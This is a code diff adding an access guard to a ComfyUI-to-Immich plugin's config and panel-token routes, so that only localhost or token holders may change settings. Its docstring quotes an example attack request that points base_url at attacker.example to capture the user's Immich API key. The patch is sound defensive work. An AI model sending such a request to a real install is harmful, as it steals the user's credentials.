@@ -169,6 +169,34 @@ def _check_auth(request: web.Request, config: ConfigManager) -> bool:
     return False
 
 
+def _sensitive_denied(request: web.Request, config: ConfigManager) -> Optional[web.Response]:
+    """敏感操作守卫：配置写入、重置、令牌管理。
+
+    ⚠️ 这些路由不能只靠 _check_auth —— 默认安装时没有 panel_token，
+    _check_auth 会放行**所有人**。那样局域网里任何设备都能：
+
+        PUT /config  {"base_url": "http://attacker.example/api"}
+
+    把 Immich 地址改成自己的服务器，下一次上传就会带着用户的 Immich
+    API key 发过去。所以这里要求「本机来源」或「已持有令牌」二者之一。
+
+    允许持有令牌的远程调用，是为了不破坏反向代理场景：ComfyUI 挂在 nginx
+    后面时 request.remote 是代理的内网地址，不是回环。
+
+    ⚠️ 这里**故意不看 _TRUST_LOCALHOST** —— 那个开关管的是「未配置令牌时
+    本机是否免鉴权」，与「来源是不是本机」是两件事。若绑在一起，一旦有人
+    关掉本机信任，管理员在本机上就再也改不了配置（把自己锁在门外）。
+    """
+    if _is_localhost(request.remote):
+        return None
+    if config.get("panel_token", "") and _check_auth(request, config):
+        return None
+    return web.json_response(
+        {"error": "该操作仅允许在本机执行，或携带有效的面板令牌（Authorization: Bearer <panel_token>）"},
+        status=403,
+    )
+
+
 def _unauthorized() -> web.Response:
     """401 统一响应：提示客户端需携带面板令牌。"""
     return web.json_response({"error": "未授权：需要 Authorization: Bearer <panel_token>"}, status=401)
@@ -202,6 +230,9 @@ def setup_routes(server) -> None:
 
     @routes.put(f"{ROUTE_PREFIX}/config")
     async def put_config(request: web.Request) -> web.Response:
+        denied = _sensitive_denied(request, config)
+        if denied is not None:
+            return denied
         if not _check_auth(request, config):
             return _unauthorized()
         try:
@@ -293,7 +324,10 @@ def setup_routes(server) -> None:
     @routes.post(f"{ROUTE_PREFIX}/config/reset")
     async def reset_config(request: web.Request) -> web.Response:
         """清空配置：恢复出厂默认（清空 Immich 地址 / API Key / 面板令牌等），
-        回到刚安装插件时的状态。需鉴权（本机免令牌，局域网需带当前令牌）。"""
+        回到刚安装插件时的状态。仅本机、或携带有效面板令牌。"""
+        denied = _sensitive_denied(request, config)
+        if denied is not None:
+            return denied
         if not _check_auth(request, config):
             return _unauthorized()
         config.reset()
@@ -307,7 +341,11 @@ def setup_routes(server) -> None:
 
         无令牌时（首次）直接生成；已有令牌时要求鉴权，防止他人"换锁"
         把现有会话全部锁在外面。明文只在本次响应中出现一次（阅后即焚）。
+        仅本机、或携带有效面板令牌 —— 否则远程可以抢先设置令牌把人锁在外面。
         """
+        denied = _sensitive_denied(request, config)
+        if denied is not None:
+            return denied
         if config.get("panel_token", "") and not _check_auth(request, config):
             return _unauthorized()
         token = config.generate_panel_token()
@@ -315,7 +353,13 @@ def setup_routes(server) -> None:
 
     @routes.get(f"{ROUTE_PREFIX}/panel-token")
     async def panel_token_show(request: web.Request) -> web.Response:
-        """显示当前面板令牌明文（仅本次响应下发，前端展示后即焚）。"""
+        """显示当前面板令牌明文（仅本次响应下发，前端展示后即焚）。
+
+        令牌等于管理员凭据，所以同样限制为本机或已持牌者。
+        """
+        denied = _sensitive_denied(request, config)
+        if denied is not None:
+            return denied
         if not _check_auth(request, config):
             return _unauthorized()
         token = config.get("panel_token", "")
@@ -325,7 +369,10 @@ def setup_routes(server) -> None:
 
     @routes.delete(f"{ROUTE_PREFIX}/panel-token")
     async def panel_token_clear(request: web.Request) -> web.Response:
-        """清除面板令牌（回到信任模式）。必须鉴权。"""
+        """清除面板令牌（回到信任模式）。仅本机或已持牌者。"""
+        denied = _sensitive_denied(request, config)
+        if denied is not None:
+            return denied
         if not _check_auth(request, config):
             return _unauthorized()
         config.clear_panel_token()
